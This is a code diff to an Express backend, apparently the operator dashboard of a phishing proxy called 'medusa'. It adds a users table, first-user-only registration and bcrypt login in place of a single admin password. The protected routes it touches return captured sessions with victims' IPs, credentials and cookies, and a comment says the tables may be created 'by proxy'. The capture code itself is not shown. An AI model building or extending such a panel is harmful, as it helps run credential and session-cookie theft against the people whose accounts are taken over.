@@ -1,6 +1,7 @@
 const express = require('express');
 const cors = require('cors');
 const jwt = require('jsonwebtoken');
+const bcrypt = require('bcryptjs');
 const Redis = require('ioredis');
 const { Pool } = require('pg');
 require('dotenv').config();
@@ -22,9 +23,16 @@ redis.on('error', (err) => console.error('[REDIS]', err.message));
 
 const REDIS_EVENTS_CHANNEL = 'medusa:events';
 
-// Initialize DB tables (optional, if not already done by proxy)
+// Initialize DB tables (including users)
 async function initializeDatabase() {
     const createTables = `
+        CREATE TABLE IF NOT EXISTS users (
+            id SERIAL PRIMARY KEY,
+            username TEXT UNIQUE NOT NULL,
+            email TEXT UNIQUE NOT NULL,
+            password_hash TEXT NOT NULL,
+            created_at TIMESTAMPTZ DEFAULT NOW()
+        );
         CREATE TABLE IF NOT EXISTS sessions (
             id TEXT PRIMARY KEY,
             ip TEXT,
@@ -70,17 +78,77 @@ function authenticate(req, res, next) {
     }
 }
 
-// Login
-app.post('/api/login', (req, res) => {
-    const { password } = req.body;
-    if (!password || password !== process.env.ADMIN_PASSWORD) {
-        return res.status(401).json({ error: 'Invalid password' });
+// ==================== AUTH ROUTES ====================
+
+// Check if setup is needed (no users exist)
+app.get('/api/setup-status', async (req, res) => {
+    try {
+        const result = await pgPool.query('SELECT COUNT(*) FROM users');
+        const count = parseInt(result.rows[0].count);
+        res.json({ needsSetup: count === 0 });
+    } catch (err) {
+        console.error(err);
+        res.status(500).json({ error: 'Failed to check setup' });
     }
-    const token = jwt.sign({ role: 'admin' }, process.env.JWT_SECRET, { expiresIn: '12h' });
-    res.json({ token });
 });
 
-// Get sessions (from Postgres, with credentials and cookie count)
+// Register (only works if no users exist)
+app.post('/api/register', async (req, res) => {
+    const { username, email, password } = req.body;
+    if (!username || !email || !password) {
+        return res.status(400).json({ error: 'All fields are required' });
+    }
+
+    try {
+        // Ensure no users exist yet (one-time setup)
+        const existing = await pgPool.query('SELECT COUNT(*) FROM users');
+        if (parseInt(existing.rows[0].count) > 0) {
+            return res.status(403).json({ error: 'Admin already registered' });
+        }
+
+        const passwordHash = await bcrypt.hash(password, 10);
+        await pgPool.query(
+            'INSERT INTO users (username, email, password_hash) VALUES ($1, $2, $3)',
+            [username, email, passwordHash]
+        );
+        res.json({ success: true });
+    } catch (err) {
+        console.error(err);
+        if (err.code === '23505') {
+            return res.status(409).json({ error: 'Username or email already exists' });
+        }
+        res.status(500).json({ error: 'Registration failed' });
+    }
+});
+
+// Login
+app.post('/api/login', async (req, res) => {
+    const { username, password } = req.body;
+    if (!username || !password) {
+        return res.status(400).json({ error: 'Username and password required' });
+    }
+
+    try {
+        const result = await pgPool.query('SELECT * FROM users WHERE username = $1', [username]);
+        if (result.rowCount === 0) {
+            return res.status(401).json({ error: 'Invalid credentials' });
+        }
+        const user = result.rows[0];
+        const valid = await bcrypt.compare(password, user.password_hash);
+        if (!valid) {
+            return res.status(401).json({ error: 'Invalid credentials' });
+        }
+        const token = jwt.sign({ userId: user.id, username: user.username }, process.env.JWT_SECRET, { expiresIn: '12h' });
+        res.json({ token });
+    } catch (err) {
+        console.error(err);
+        res.status(500).json({ error: 'Login failed' });
+    }
+});
+
+// ==================== DATA ROUTES (protected) ====================
+
+// Get sessions (with email and counts)
 app.get('/api/sessions', authenticate, async (req, res) => {
     try {
         const result = await pgPool.query(`
@@ -98,7 +166,7 @@ app.get('/api/sessions', authenticate, async (req, res) => {
     }
 });
 
-// Get a single session with full details
+// Get a single session with credentials and cookies
 app.get('/api/sessions/:id', authenticate, async (req, res) => {
     try {
         const sessionResult = await pgPool.query('SELECT * FROM sessions WHERE id = $1', [req.params.id]);
@@ -148,7 +216,7 @@ app.get('/api/cookies', authenticate, async (req, res) => {
     }
 });
 
-// Stats endpoint
+// Stats
 app.get('/api/stats', authenticate, async (req, res) => {
     try {
         const sessions = await pgPool.query('SELECT COUNT(*) FROM sessions');
